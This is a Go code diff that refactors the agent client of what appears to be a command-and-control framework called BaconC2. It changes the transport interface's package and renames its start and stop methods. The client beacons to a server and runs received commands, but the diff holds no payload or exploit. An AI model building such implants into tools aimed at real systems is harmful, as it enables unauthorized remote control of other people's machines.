@@ -5,21 +5,21 @@ import (
 
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
-	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 )
 
 type AgentClient struct {
 	config          *config.AgentConfig
-	transport       local_models.ITransportProtocol
+	transport       transport.ITransportProtocol
 	commandExecutor models.ICommandExecutor
 	resultsQueue    queue.IResultQueue
 	agent           models.Agent
 	isRunning       bool
 }
 
-func NewAgentClient(cfg *config.AgentConfig, tr local_models.ITransportProtocol, commandExecutor models.ICommandExecutor, commandQueue queue.ICommandQueue, resultsQueue queue.IResultQueue) *AgentClient {
+func NewAgentClient(cfg *config.AgentConfig, tr transport.ITransportProtocol, commandExecutor models.ICommandExecutor, commandQueue queue.ICommandQueue, resultsQueue queue.IResultQueue) *AgentClient {
 	return &AgentClient{
 		config:          cfg,
 		transport:       tr,
@@ -56,7 +56,7 @@ func (c *AgentClient) Start() error {
 
 	c.isRunning = true
 	log.Printf("Agent %s started, beaconing every %s", c.agent.ID, c.config.BeaconInterval)
-	go c.transport.RunProtocol()
+	go c.transport.Start()
 
 	return nil
 }
@@ -68,7 +68,7 @@ func (c *AgentClient) Stop() {
 
 	c.isRunning = false
 
-	if err := c.transport.Close(); err != nil {
+	if err := c.transport.Stop(); err != nil {
 		log.Printf("Error closing transport: %v", err)
 	}
 }
